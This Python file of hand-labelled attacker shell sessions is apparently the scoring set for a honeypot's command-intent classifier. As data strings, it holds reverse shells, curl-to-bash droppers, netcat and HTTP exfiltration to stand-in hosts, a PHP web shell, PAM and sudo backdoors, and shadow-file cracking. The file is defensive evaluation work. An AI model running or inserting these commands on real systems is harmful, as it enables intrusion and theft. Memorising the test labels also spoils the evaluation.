"""Hand-labelled attacker sessions: the reference intent classification is scored against.

Why this exists
---------------
The training data is generated, so accuracy measured on it describes how well
the model learned the generator rather than how it behaves on traffic. The
first generator scored 1.000 under cross-validation even from timestamps alone,
which is the generator leaking its labels, not the model being good. This file
is the held-out yardstick instead: written by hand, never imported by the
training code, and shaped exactly the way the sidecar classifies live sessions.

How it is scored
----------------
`honeypot-ecosystem/shared/sidecar/brain_courier.py` classifies a sliding
window of the last three commands (CLASSIFY_WINDOW), never fewer than two
(CLASSIFY_EVERY). `evaluation.py` slides the same window over each transcript
and labels each window with the stage the attacker is in at its newest
command: intent here means "what are they doing now", because that is what
decides which decoy is worth planting next.

Labelling guide
---------------
reconnaissance        learning about the host or network they are on: system,
                      users, processes, sockets, files, configs, secrets left
                      lying around, listing cron or keys, probing neighbours.
privilege_escalation  gaining privilege they did not log in with: sudo and su,
                      SUID and capability hunting, sudoers, exploits, reading
                      or cracking /etc/shadow.
persistence           making sure they can come back: installing cron jobs,
                      writing authorized_keys, new accounts, changed passwords,
                      systemd units, rc.local, shell-profile hooks.
lateral_movement      using credentials or keys to reach another machine:
                      ssh, scp, sftp or rsync to internal hosts, sshpass,
                      tunnels through a compromised host.
data_exfiltration     collecting and moving data out: reading records from a
                      database, dumps, archives, encoding, and transfers to
                      addresses outside the estate.

A command run through `sudo` is privilege escalation (MITRE T1548.003, abuse
of sudo) unless what it runs is a deeper stage: `sudo useradd` is persistence,
`sudo tail /var/log/auth.log` is privilege escalation.

`N` marks a command with no stage of its own -- cd, chmod +x, fetching or
running a tool, clearing history. It takes the stage of the commands around
it, and windows made only of such commands are reported separately: nothing
in them could tell any classifier what stage the attacker is in.

Splits
------
`dev` transcripts may be inspected window by window while improving the
classifier. `test` transcripts are for the headline number only; tuning
against their individual mistakes would turn them into a second dev set.

Be clear about what dev and test can show: they were written alongside the
rules, so they measure whether the rules cover the attack patterns they were
written for. `holdout` is written only after the rules and the model are
frozen, deliberately reaching for commands and styles neither was built
around, and is scored once. It is the closest thing here to unseen traffic;
real captured sessions from the deployed honeypot would be better still.

A holdout is spent the moment its mistakes are looked at, and then lives in
`test`:
  v1  10 sessions,  32 windows, scored 0.844 (stateless hybrid)
  v2  44 sessions, 151 windows, scored 0.841 stateless, later 0.861 with
      session context
  v3  30 real SSH sessions from the CyberLab honeynet, 509 windows, in
      captured_sessions.json: 0.768 with session context (CI 0.73-0.80),
      0.815 traffic-weighted. Labelled by the rules' author, before scoring.
      Misses: windows just after a password change still called persistence
      (the label there is a convention call), `scp -t` -- the receiving end
      of an upload -- read as lateral movement, and model guesses on `^C`
      and encoded payloads.
Each replacement is written only after the rule and model work it measures
is frozen. v3's misses have been looked at, so it is spent: move it to test
before the next. Sessions the deployed honeypot captures, or a set written by
someone who has not read the rules, would be fairer still.

Captured sessions
-----------------
Sessions the sensors recorded live in `captured_sessions.json`, not in this
file: they are extracted by `captures.py`, labelled by hand with the guide
above, and scored with the timestamps they were captured with. They join
TRANSCRIPTS under whatever split each one is given. Each stands for every
captured run of its script, so the evaluation also reports a traffic-weighted
accuracy: one bot can be nearly all of a day's sessions.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import NamedTuple, Optional

R = "reconnaissance"
P = "privilege_escalation"
S = "persistence"
L = "lateral_movement"
X = "data_exfiltration"
N: Optional[str] = None


class Transcript(NamedTuple):
    name: str
    split: str
    #: "human" or "bot". Only sets the gaps between timestamps, so the
    #: classifier sees the typing tempo the sidecar would actually report.
    tempo: str
    source: str
    steps: tuple[tuple[str, Optional[str]], ...]
    #: The real timestamp of each step, for a captured session. Written
    #: transcripts leave it out and are given timestamps at `tempo`.
    stamps: Optional[tuple[str, ...]] = None
    #: How many captured sessions ran this script (captures.py merges them).
    weight: int = 1


HAND_WRITTEN: tuple[Transcript, ...] = (
    # ------------------------------------------------------------------ dev
    Transcript(
        "readme_walkthrough", "dev", "human",
        "honeypot-ecosystem/README.md, 'Walk the whole chain'",
        (
            ("w", R),
            ("last | head", R),
            ("ps aux | head", R),
            ("ls -la /home/devuser", R),
            ("grep DEPLOY_KEY /opt/deploy/sync-erp.sh", R),
            ("sudo cp /home/ta_miller/.ssh/id_erp_deploy /tmp/k", P),
            ("sudo chown devuser /tmp/k", P),
            ("chmod 600 /tmp/k", N),
            ("ssh -i /tmp/k -o StrictHostKeyChecking=no deploy@erp-web", L),
            ("cat /opt/erp/settings.py", R),
            ("set +H", N),
            ('mysql -h db-01 -u erp_admin -pTr3llis!84m -e "select count(*) from erp.students;"', X),
        ),
    ),
    Transcript(
        "fingerprint_bot", "dev", "bot",
        "the SSH bot fingerprinting sequence common in public Cowrie captures",
        (
            ("cat /proc/cpuinfo | grep name | wc -l", R),
            ('echo "root:Fz8k2LmQ9wx"|chpasswd|bash', S),
            ("rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;", N),
            ("cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", R),
            ("free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", R),
            ("ls -lh $(which ls)", R),
            ("crontab -l", R),
            ("w", R),
            ("uname -m", R),
            ("cat /proc/cpuinfo | grep model | grep name | wc -l", R),
            ("top", R),
            ("uname -a", R),
            ("whoami", R),
            ("lscpu | grep Model", R),
            ("df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", R),
        ),
    ),
    Transcript(
        "ssh_key_backdoor_bot", "dev", "bot",
        "the authorized_keys-replacing bot campaign seen across SSH honeypots",
        (
            ("uname -s -v -n -r -m", R),
            ('cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1 mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~', S),
            ("chattr -ia .ssh; lockr -ia .ssh", S),
            ("uname -a", R),
        ),
    ),
    Transcript(
        "miner_dropper_bot", "dev", "bot",
        "coin-miner dropper with cron and rc.local persistence",
        (
            ("cd /tmp || cd /var/run || cd /mnt", N),
            ("wget -q http://203.0.113.45/x86_64 -O .k || curl -s -o .k http://203.0.113.45/x86_64", N),
            ("chmod +x .k", N),
            ("./.k -o pool.example.net:3333 -B", N),
            ('(crontab -l 2>/dev/null; echo "*/15 * * * * /tmp/.k -o pool.example.net:3333 -B >/dev/null 2>&1") | crontab -', S),
            ("echo '/tmp/.k -B &' >> /etc/rc.local", S),
            ("history -c", N),
        ),
    ),
    Transcript(
        "suid_privesc", "dev", "human",
        "hands-on local privilege escalation via SUID and PwnKit",
        (
            ("id", R),
            ("uname -r", R),
            ("sudo -l", P),
            ("find / -perm -4000 -type f 2>/dev/null", P),
            ("getcap -r / 2>/dev/null", P),
            ("ls -la /usr/bin/pkexec", N),
            ("cd /dev/shm", N),
            ("wget http://198.51.100.23/cve-2021-4034.c", N),
            ("gcc cve-2021-4034.c -o pk", N),
            ("./pk", N),
            ("whoami", R),
            ("cat /etc/shadow", P),
        ),
    ),
    Transcript(
        "lateral_ssh_hunt", "dev", "human",
        "reusing keys and passwords against neighbouring hosts",
        (
            ("cat ~/.ssh/known_hosts", R),
            ("cat ~/.ssh/config", R),
            ("ssh -i ~/.ssh/id_rsa_backup admin@10.60.0.41", L),
            ("for h in 10.60.0.21 10.60.0.31 10.60.0.41; do ssh -o ConnectTimeout=3 -o BatchMode=yes deploy@$h hostname; done", L),
            ("sshpass -p 'Winter2024!' ssh -o StrictHostKeyChecking=no root@10.60.0.31", L),
            ("scp /tmp/k deploy@10.60.0.21:/tmp/.k", L),
        ),
    ),
    Transcript(
        "erp_db_dump", "dev", "human",
        "the node-02 -> node-03 database stage, dumped and shipped out",
        (
            ("grep -i pass /opt/erp/*.py", R),
            ("mysql -h db-01 -u erp_admin -p'Tr3llis!84m' -e 'show tables' erp", R),
            ("mysql -h db-01 -u erp_admin -p'Tr3llis!84m' -e 'describe students' erp", R),
            ("mysqldump -h db-01 -u erp_admin -p'Tr3llis!84m' --single-transaction erp > /tmp/.e.sql", X),
            ("gzip -9 /tmp/.e.sql", X),
            ("curl -s -T /tmp/.e.sql.gz ftp://203.0.113.77/incoming/ --user anon:anon", X),
            ("rm -f /tmp/.e.sql.gz", N),
        ),
    ),
    Transcript(
        "internal_web_probe", "dev", "human",
        "probing the ERP host's services from the jump host",
        (
            ("curl -I http://erp-web:8080/", R),
            ("curl -s http://erp-web:8080/admin | head -20", R),
            ("nmap -sT -p 22,80,443,3306,8080 10.60.0.0/24", R),
            ("ping -c 2 db-01", R),
            ("nc -zv db-01 3306", R),
        ),
    ),
    Transcript(
        "authorized_keys_manual", "dev", "human",
        "reading, then appending to, authorized_keys by hand",
        (
            ("ls -la ~/.ssh", R),
            ("cat ~/.ssh/authorized_keys", R),
            ("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf3kLq op@kali' >> ~/.ssh/authorized_keys", S),
            ("chmod 600 ~/.ssh/authorized_keys", N),
            ("grep -i permitrootlogin /etc/ssh/sshd_config", R),
        ),
    ),
    Transcript(
        "scripted_chain_bot", "dev", "bot",
        "one-shot bot script: fingerprint, sudo check, password change, cron",
        (
            ("uname -a; id; cat /etc/issue", R),
            ("sudo -n true && echo SUDO_OK", P),
            ('echo "root:Xn9!kd2Lq" | chpasswd', S),
            ('(crontab -l 2>/dev/null; echo "* * * * * curl -fsSL http://203.0.113.45/u.sh | sh") | crontab -', S),
        ),
    ),
    Transcript(
        "cloud_creds", "dev", "human",
        "harvesting the planted cloud credentials and pulling a backup",
        (
            ("env | grep -i -E 'key|token|secret|pass'", R),
            ("cat ~/.aws/credentials", R),
            ("cat ~/.netrc", R),
            ("aws s3 ls --profile erp-staging", R),
            ("aws s3 cp s3://erp-staging-backups/db/latest.sql.gz /tmp/", X),
            ("tar czf /tmp/.b.tgz /tmp/latest.sql.gz ~/.aws", X),
        ),
    ),
    Transcript(
        "systemd_backdoor", "dev", "human",
        "root shell, then a backdoor installed as a systemd service",
        (
            ("sudo -i", P),
            ("ls /etc/systemd/system", R),
            ("cp /tmp/.x/kworker /usr/local/bin/kworkerd", S),
            ("printf '[Unit]\\nDescription=kworker\\n[Service]\\nExecStart=/usr/local/bin/kworkerd\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/kworkerd.service", S),
            ("systemctl daemon-reload", S),
            ("systemctl enable --now kworkerd.service", S),
        ),
    ),
    # ----------------------------------------------------------------- test
    Transcript(
        "account_backdoor", "test", "human",
        "root, then a hidden sudo-capable account with an immutable key",
        (
            ("sudo su -", P),
            ("useradd -m -s /bin/bash -G sudo sysbackup", S),
            ("echo 'sysbackup:Qw3rty!2024' | chpasswd", S),
            ("mkdir -p /home/sysbackup/.ssh", N),
            ("echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq0n7 ops@vps' > /home/sysbackup/.ssh/authorized_keys", S),
            ("chattr +i /home/sysbackup/.ssh/authorized_keys", S),
            ("grep sysbackup /etc/passwd", R),
        ),
    ),
    Transcript(
        "archive_netcat", "test", "bot",
        "stage home directories and push them over a raw socket",
        (
            ("tar czf /tmp/.h.tgz /home/*/Documents /home/*/.ssh 2>/dev/null", X),
            ("base64 -w0 /tmp/.h.tgz > /tmp/.h.b64", X),
            ("nc 198.51.100.66 9001 < /tmp/.h.tgz", X),
        ),
    ),
    Transcript(
        "http_server_exfil", "test", "human",
        "zip the exports and serve them to the attacker's own box",
        (
            ("cd /srv/exports", N),
            ("ls -la", R),
            ("zip -r /tmp/exports.zip /srv/exports", X),
            ("python3 -m http.server 8088 --directory /tmp", X),
        ),
    ),
    Transcript(
        "credential_cracking", "test", "human",
        "sudo escape through vim, then offline password cracking",
        (
            ("sudo -l", P),
            ("sudo /usr/bin/vim -c ':!/bin/bash'", P),
            ("cat /etc/shadow", P),
            ("unshadow /etc/passwd /etc/shadow > /tmp/h.txt", P),
            ("john /tmp/h.txt --wordlist=/usr/share/wordlists/rockyou.txt", P),
        ),
    ),
    Transcript(
        "pivot_and_stage", "test", "human",
        "pull the ERP source over ssh, ship it out, stage a copy internally",
        (
            ("ssh deploy@erp-web 'tar czf - /var/www/erp' > /tmp/erp-src.tgz", X),
            ("rsync -az /tmp/erp-src.tgz backup@203.0.113.90:/srv/drop/", X),
            ("rsync -az /var/www/erp/ deploy@10.60.0.21:/tmp/stage/", L),
        ),
    ),
    Transcript(
        "short_scanner", "test", "bot",
        "the two-command scanner that never comes back",
        (
            ("uname -a", R),
            ("nproc", R),
        ),
    ),
    Transcript(
        "iot_busybox_bot", "test", "bot",
        "Mirai-style IoT bot probing for busybox, then dropping a binary",
        (
            ("enable", N),
            ("system", N),
            ("shell", N),
            ("sh", N),
            ("/bin/busybox ECCHI", R),
            ("cat /proc/mounts", R),
            ("/bin/busybox wget http://203.0.113.9/m.arm7 -O /tmp/m; chmod 777 /tmp/m; /tmp/m telnet.arm7", N),
        ),
    ),
    Transcript(
        "revshell_persistence", "test", "human",
        "reverse shell in .bashrc and an @reboot cron entry",
        (
            ("echo 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1' >> ~/.bashrc", S),
            ("echo '@reboot root /usr/local/bin/kworkerd' > /etc/cron.d/kworker", S),
            ("chmod 644 /etc/cron.d/kworker", N),
            ("cat /etc/cron.d/kworker", N),
        ),
    ),
    Transcript(
        "docker_escape", "test", "human",
        "docker group membership turned into root on the host filesystem",
        (
            ("id", R),
            ("groups", R),
            ("docker ps", R),
            ("docker run -v /:/mnt --rm -it alpine chroot /mnt sh", P),
            ("cat /mnt/etc/shadow", P),
        ),
    ),
    Transcript(
        "postgres_exfil", "test", "human",
        "the database stage against PostgreSQL instead of MySQL",
        (
            ("cat /var/www/app/.env", R),
            ("psql -h 10.60.0.31 -U app -d appdb -c '\\dt'", R),
            ("psql -h 10.60.0.31 -U app -d appdb -c 'select count(*) from customers'", X),
            ("pg_dump -h 10.60.0.31 -U app appdb > /tmp/appdb.sql", X),
            ("split -b 20M /tmp/appdb.sql /tmp/appdb.part", X),
            ("curl -F 'f=@/tmp/appdb.partaa' https://198.51.100.20/u", X),
        ),
    ),
    Transcript(
        "recon_heavy_human", "test", "human",
        "a careful operator mapping the host before touching anything",
        (
            ("hostnamectl", R),
            ("cat /etc/os-release", R),
            ("ss -tulpn", R),
            ("ip route", R),
            ("arp -a", R),
            ("cat /etc/hosts", R),
            ("find / -name '*.pem' -o -name 'id_rsa*' 2>/dev/null", R),
            ("ls -la /opt /srv /var/www", R),
        ),
    ),
    Transcript(
        "pivot_tunnel", "test", "human",
        "tunnelling through the ERP host to reach the database and a new subnet",
        (
            ("ssh -L 3307:db-01:3306 deploy@erp-web -N -f", L),
            ("mysql -h 127.0.0.1 -P 3307 -u erp_admin -p'Tr3llis!84m' -e 'select * from erp.admin_users'", X),
            ("ssh -D 1080 deploy@erp-web -N -f", L),
            ("proxychains nmap -sT -p 445 10.61.0.0/24", R),
        ),
    ),
    # ------------------------------------------- test (formerly holdout v1)
    Transcript(
        "sshd_backdoor_config", "test", "human",
        "re-enabling root login and password auth so the box stays reachable",
        (
            ("cat /etc/ssh/sshd_config | grep -E 'PermitRoot|PasswordAuth'", R),
            ("sudo sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config", S),
            ("sudo sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config", S),
            ("sudo systemctl restart ssh", P),
            ("echo 'root:Sup3rS3cret' | sudo chpasswd", S),
        ),
    ),
    Transcript(
        "keepass_hunt", "test", "human",
        "looking for password vaults and history, then taking them",
        (
            ("history | grep -i ssh", R),
            ("find / -name '*.kdbx' 2>/dev/null", R),
            ("ls -la /home/ta_miller/Documents", R),
            ("cp /home/ta_miller/Documents/passwords.kdbx /tmp/.p", X),
            ("gpg -c --batch --passphrase x /tmp/.p", X),
            ("curl -s --upload-file /tmp/.p.gpg https://transfer.example.net/p.gpg", X),
        ),
    ),
    Transcript(
        "disk_image_exfil", "test", "bot",
        "imaging a disk straight into a socket",
        (
            ("lsblk", R),
            ("dd if=/dev/sda bs=4M | gzip -1 | nc 198.51.100.44 7000", X),
        ),
    ),
    Transcript(
        "reverse_tunnel_c2", "test", "human",
        "a reverse tunnel out, then walking the internal network through it",
        (
            ("ssh -R 9001:localhost:22 tunnel@198.51.100.80 -N -f", L),
            ("ss -lntp", R),
            ("for p in 22 80 3306; do timeout 1 bash -c \"echo > /dev/tcp/10.60.0.31/$p\" && echo open $p; done", R),
            ("scp -r deploy@10.60.0.21:/var/www/erp/config /tmp/erpconf", L),
        ),
    ),
    Transcript(
        "sudo_alias_capture", "test", "human",
        "hooking sudo through .bashrc to capture the real user's password",
        (
            ("cat ~/.bashrc", R),
            ("echo 'alias sudo=\"/tmp/.s/sudo\"' >> ~/.bashrc", S),
            ("mkdir -p /tmp/.s", N),
            ("cp /tmp/sudo-logger /tmp/.s/sudo && chmod +x /tmp/.s/sudo", N),
        ),
    ),
    Transcript(
        "shadow_copy_crack", "test", "human",
        "copying the password store off for offline cracking",
        (
            ("sudo -l", P),
            ("sudo cp /etc/shadow /tmp/.sh", P),
            ("sudo chmod 644 /tmp/.sh", P),
            ("scp /tmp/.sh op@198.51.100.12:/loot/", X),
        ),
    ),
    Transcript(
        "kube_recon", "test", "human",
        "an operator who finds kubectl configured and looks around the cluster",
        (
            ("cat ~/.kube/config", R),
            ("kubectl get nodes -o wide", R),
            ("kubectl get secrets -A", R),
            ("kubectl exec -it erp-web-7d9 -- /bin/sh", L),
        ),
    ),
    Transcript(
        "perl_revshell_cron", "test", "bot",
        "a scripted perl reverse shell installed into root's crontab",
        (
            ("id; uname -a", R),
            ("echo '*/3 * * * * perl -e \"use Socket;...\"' | crontab -u root -", S),
            ("crontab -u root -l", R),
        ),
    ),
    Transcript(
        "interactive_mysql", "test", "human",
        "an interactive mysql session, each SQL line recorded like a command",
        (
            ("mysql -h db-01 -u erp_admin -p", L),
            ("show databases;", R),
            ("use erp;", R),
            ("select roll, name, cgpa from students limit 20;", X),
            ("select * into outfile '/tmp/s.csv' from students;", X),
        ),
    ),
    Transcript(
        "firewall_and_logs", "test", "human",
        "an intruder tampering with logs and the firewall before leaving a user",
        (
            ("sudo iptables -L -n", P),
            ("sudo iptables -F", P),
            ("sudo useradd -r -s /bin/bash -d /var/lib/.sys sysd", S),
            ("sudo tail -n 20 /var/log/auth.log", P),
            ("sudo sh -c '> /var/log/auth.log'", P),
        ),
    ),
    # ------------------------------------------- test (formerly holdout v2)
    # Written after the ATT&CK-family rules and the dataset-v3 model were
    # frozen, scored once, then its misses were inspected.
    Transcript("gtfobins_less", "test", "human", "sudo-allowed pager turned into a root shell", (
        ("id", R), ("sudo -l", P), ("sudo less /etc/hosts", P), ("whoami", R),
        ("cat /root/.ssh/id_rsa", R), ("cat /root/.bash_history", R),
    )),
    Transcript("suid_bash_copy", "test", "human", "a SUID copy of bash kept as a way back to root", (
        ("find / -perm -u=s -type f 2>/dev/null | head -20", P),
        ("cp /bin/bash /var/tmp/.bash && chmod u+s /var/tmp/.bash", P),
        ("/var/tmp/.bash -p", P), ("id", R), ("cat /etc/shadow | head -3", P),
    )),
    Transcript("cap_setuid_python", "test", "human", "cap_setuid on python used to become root", (
        ("getcap -r / 2>/dev/null", P),
        ("/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", P),
        ("whoami", R), ("ls -la /root", R),
    )),
    Transcript("cron_script_hijack", "test", "human", "a world-writable script run by root's cron, hijacked", (
        ("cat /etc/crontab", R), ("ls -la /opt/scripts/backup.sh", R),
        ("echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh", P),
        ("sleep 61", N), ("/tmp/rootbash -p", P), ("id", R),
    )),
    Transcript("docker_group_root", "test", "human", "docker group to host root, then a sudoers drop-in", (
        ("id", R), ("docker images", R), ("docker run -it --rm -v /:/host alpine chroot /host bash", P),
        ("cat /etc/shadow", P), ("echo 'ops ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/ops", P),
    )),
    Transcript("lxd_escape", "test", "human", "lxd group membership turned into a privileged container", (
        ("id", R), ("lxc image list", R), ("lxc init alpine pv -c security.privileged=true", P),
        ("lxc config device add pv host-root disk source=/ path=/mnt/root recursive=true", P),
        ("lxc start pv && lxc exec pv /bin/sh", P),
    )),
    Transcript("systemd_heredoc", "test", "human", "a systemd unit written line by line through a heredoc", (
        ("sudo -i", P), ("cat > /etc/systemd/system/sync.service <<'EOF'", S), ("[Unit]", N),
        ("Description=Sync agent", N), ("[Service]", N), ("ExecStart=/opt/.s/sync", N), ("EOF", N),
        ("systemctl enable --now sync.service", S),
    )),
    Transcript("agent_hijack", "test", "human", "riding another user's forwarded ssh-agent", (
        ("ls -la /tmp/ssh-*", R), ("SSH_AUTH_SOCK=/tmp/ssh-Xc9fE2/agent.1442 ssh-add -l", R),
        ("SSH_AUTH_SOCK=/tmp/ssh-Xc9fE2/agent.1442 ssh ta_miller@erp-web", L), ("hostname", R),
    )),
    Transcript("proxyjump_db", "test", "human", "ProxyJump straight through erp-web to the database host", (
        ("ssh -J deploy@erp-web dbadmin@db-01", L), ("hostname; id", R),
        ("mysql -u root -e 'show databases'", R),
        ("mysqldump -u root --all-databases | gzip > /tmp/.a.gz", X), ("exit", N),
    )),
    Transcript("rsync_daemon_exfil", "test", "bot", "content archived and pushed to an rsync daemon", (
        ("tar cf - /srv/erp-content | xz -9 > /tmp/.c.txz", X),
        ("rsync -avz /tmp/.c.txz rsync://203.0.113.15/drop/", X), ("rm -f /tmp/.c.txz", N),
    )),
    Transcript("redis_mongo_dump", "test", "human", "the session store and a collection, dumped", (
        ("redis-cli -h 10.60.0.31 info keyspace", R),
        ("redis-cli -h 10.60.0.31 --scan --pattern 'session:*' | head", R),
        ("redis-cli -h 10.60.0.31 --rdb /tmp/.r.rdb", X),
        ("mongoexport --uri mongodb://10.60.0.31/erp --collection students --out /tmp/.s.json", X),
    )),
    Transcript("web_shell_drop", "test", "human", "a PHP web shell dropped beside the site", (
        ("ls -la /var/www/html", R), ("cat /etc/nginx/sites-enabled/default", R),
        ("echo '<?php @eval($_POST[\"x\"]); ?>' > /var/www/html/wp-cron-status.php", S),
        ("curl -s http://localhost/wp-cron-status.php", N),
    )),
    Transcript("pam_backdoor", "test", "human", "a replaced PAM module and a permissive auth line", (
        ("ls -la /lib/x86_64-linux-gnu/security/ | head", R),
        ("cp /tmp/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so", S),
        ("echo 'auth sufficient pam_permit.so' >> /etc/pam.d/common-auth", S),
        ("touch -r /etc/pam.d/sshd /etc/pam.d/common-auth", N),
    )),
    Transcript("uid0_account_bot", "test", "bot", "a second uid-0 account and a sudoers line", (
        ("echo 'sys2:$1$xyz$abcdefghijklmnopqrstu/:0:0::/root:/bin/bash' >> /etc/passwd", S),
        ("echo 'sys2 ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", P), ("passwd -d sys2", S),
    )),
    Transcript("cloud_key_persistence", "test", "human", "staging backups pulled, then a new access key minted", (
        ("cat ~/.aws/config", R), ("aws sts get-caller-identity --profile erp-staging", R),
        ("aws s3 ls s3://erp-staging-backups --recursive | tail", R),
        ("aws s3 sync s3://erp-staging-backups /tmp/.b --quiet", X),
        ("aws iam create-access-key --user-name ops-ci", S),
    )),
    Transcript("kube_secrets_and_exec", "test", "human", "secrets read, then commands run inside the workload", (
        ("kubectl get secrets -n erp", R),
        ("kubectl get secret erp-db -n erp -o jsonpath='{.data.password}' | base64 -d", R),
        ("kubectl exec -n erp deploy/erp-web -- env", L),
        ("kubectl port-forward -n erp svc/erp-db 3306:3306", L),
    )),
    Transcript("ansible_fleet", "test", "human", "the ops inventory used to reach every host at once", (
        ("cat /etc/ansible/hosts", R), ("ansible all -m ping", L),
        ("ansible erp -b -m shell -a 'cat /etc/shadow'", L),
    )),
    Transcript("competitor_killer_bot", "test", "bot", "rival miners killed, then a loader installed in cron", (
        ("ps aux | grep -E 'xmrig|kinsing|kdevtmpfsi' | grep -v grep", R),
        ("pkill -9 -f kinsing; pkill -9 -f kdevtmpfsi", N), ("rm -rf /tmp/kdevtmpfsi /var/tmp/kinsing", N),
        ("curl -s http://198.51.100.200/ldr.sh | bash", N),
        ("(crontab -l; echo '*/30 * * * * curl -s http://198.51.100.200/ldr.sh | bash') | crontab -", S),
    )),
    Transcript("internal_ssh_bruteforce", "test", "human", "sweeping the subnet, then guessing root's password", (
        ("cat /etc/hosts", R),
        ("for ip in $(seq 20 40); do timeout 1 bash -c \"</dev/tcp/10.60.0.$ip/22\" && echo 10.60.0.$ip; done", R),
        ("hydra -l root -P /tmp/pw.txt ssh://10.60.0.31", L),
        ("sshpass -p 'Winter2024!' ssh root@10.60.0.31 id", L),
    )),
    Transcript("dns_tunnel_exfil", "test", "human", "documents smuggled out as DNS lookups", (
        ("tar czf - /home/ta_miller/Documents | base64 -w 63 > /tmp/.d", X),
        ("for l in $(cat /tmp/.d); do dig +short $l.x.203.0.113.66.nip.io; done", X), ("rm /tmp/.d", N),
    )),
    Transcript("ftp_interactive_exfil", "test", "human", "an interactive ftp upload, each client line recorded", (
        ("zip -qr /tmp/.e.zip /srv/exports", X), ("ftp -n 203.0.113.70", X), ("user anonymous x", N),
        ("binary", N), ("put /tmp/.e.zip", X), ("bye", N),
    )),
    Transcript("gpu_fingerprint_bot", "test", "bot", "a miner bot checking for GPUs and shared memory", (
        ("uname -s -m", R), ("cat /proc/cpuinfo | grep -c processor", R), ("nvidia-smi -q | head", R),
        ("ls -la /dev/shm", R), ("echo -e '\\x41\\x41'", N), ("cat /etc/shells", R),
    )),
    Transcript("root_key_bot", "test", "bot", "root's authorized_keys replaced and locked", (
        ("mkdir -p /root/.ssh", N), ("chmod 700 /root/.ssh", N),
        ("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDq7g bot@c2' > /root/.ssh/authorized_keys", S),
        ("chattr +ia /root/.ssh/authorized_keys", S), ("passwd -l root", S),
    )),
    Transcript("erp_app_backdoor", "test", "human", "the portal's login patched to capture credentials", (
        ("cat /opt/erp/settings.py | grep -i -E 'db|secret'", R), ("cp /opt/erp/app.py /opt/erp/.app.py.bak", N),
        ("sed -i 's/def login(/def login(request):\\n    _grab(request)\\ndef _orig_login(/' /opt/erp/app.py", S),
        ("systemctl restart erp-portal", N),
    )),
    Transcript("remote_linpeas", "test", "human", "an enumeration script pushed to and run on the next host", (
        ("scp /tmp/linpeas.sh deploy@erp-web:/tmp/", L),
        ("ssh deploy@erp-web 'bash /tmp/linpeas.sh > /tmp/lp.txt'", L),
        ("scp deploy@erp-web:/tmp/lp.txt .", L), ("grep -i -E 'sudo|suid|cap_' lp.txt | head -40", R),
    )),
    Transcript("db_backdoor_account", "test", "human", "a database account added for later, then fee records read", (
        ("mysql -u root -e \"select user,host,plugin from mysql.user\"", R),
        ("mysql -u root -e \"CREATE USER 'repl2'@'%' IDENTIFIED BY 'Rep1!cate'; GRANT ALL ON *.* TO 'repl2'@'%';\"", S),
        ("mysql -u root -e \"select * from erp.fees where amount > 10000\"", X),
    )),
    Transcript("proc_secrets", "test", "human", "credentials pulled from a running process", (
        ("cat /proc/$(pgrep -f erp-portal)/environ | tr '\\0' '\\n' | grep -i pass", R),
        ("strings /proc/1442/mem 2>/dev/null | grep -i password | head", R), ("ps -ef --forest", R),
    )),
    Transcript("tar_over_ssh", "test", "human", "the database directory streamed out over ssh", (
        ("du -sh /var/lib/mysql", R),
        ("tar czf - /var/lib/mysql | ssh drop@203.0.113.33 'cat > erp.tgz'", X),
    )),
    Transcript("truncate_logs", "test", "human", "logs emptied with sudo before leaving", (
        ("sudo truncate -s 0 /var/log/auth.log", P), ("sudo rm -f /var/log/wtmp.1", P), ("history -c", N),
    )),
    Transcript("pg_tunnel_dump", "test", "human", "a local forward to PostgreSQL, then a dump", (
        ("ssh -fN -L 5432:10.60.0.31:5432 deploy@erp-web", L),
        ("psql -h 127.0.0.1 -U erp -d erp -c 'select count(*) from students'", X),
        ("pg_dump -h 127.0.0.1 -U erp erp | gzip > /tmp/.pg.gz", X),
    )),
    Transcript("wide_recon_bot", "test", "bot", "a fast fingerprinting sweep", (
        ("cat /etc/*release", R), ("ip -br a", R), ("ss -s", R), ("df -h /", R), ("free -g", R), ("uptime -p", R),
    )),
    Transcript("paste_exfil", "test", "human", "keys piped straight to a paste service", (
        ("ls -la ~/.aws ~/.ssh", R),
        ("cat ~/.aws/credentials ~/.ssh/id_rsa | curl -s -F 'f:1=<-' ix.io", X),
    )),
    Transcript("telnet_iot_hop", "test", "human", "a hop to an internal device over telnet", (
        ("cat /etc/hosts", R), ("telnet 10.60.4.12", L), ("root", N), ("admin", N), ("cat /proc/cpuinfo", R),
    )),
    Transcript("readme_chain_variant", "test", "human", "the documented chain, done slightly differently", (
        ("ls -la /opt/deploy", R), ("grep -n KEY /opt/deploy/*.sh", R),
        ("sudo cat /home/ta_miller/.ssh/id_erp_deploy > /tmp/.k", P), ("chmod 400 /tmp/.k", N),
        ("ssh -i /tmp/.k deploy@erp-web", L), ("cat /opt/erp/settings.py", R),
        ("mysql -h db-01 -u erp_admin -p'Tr3llis!84m' erp -e 'select roll, name, cgpa from students'", X),
    )),
    Transcript("bashrc_alias_hook", "test", "human", "a background payload hidden in an ls alias", (
        ("echo 'alias ls=\"ls --color=auto; /tmp/.u &>/dev/null &\"' >> ~/.bashrc", S),
        ("source ~/.bashrc", N), ("ls", R),
    )),
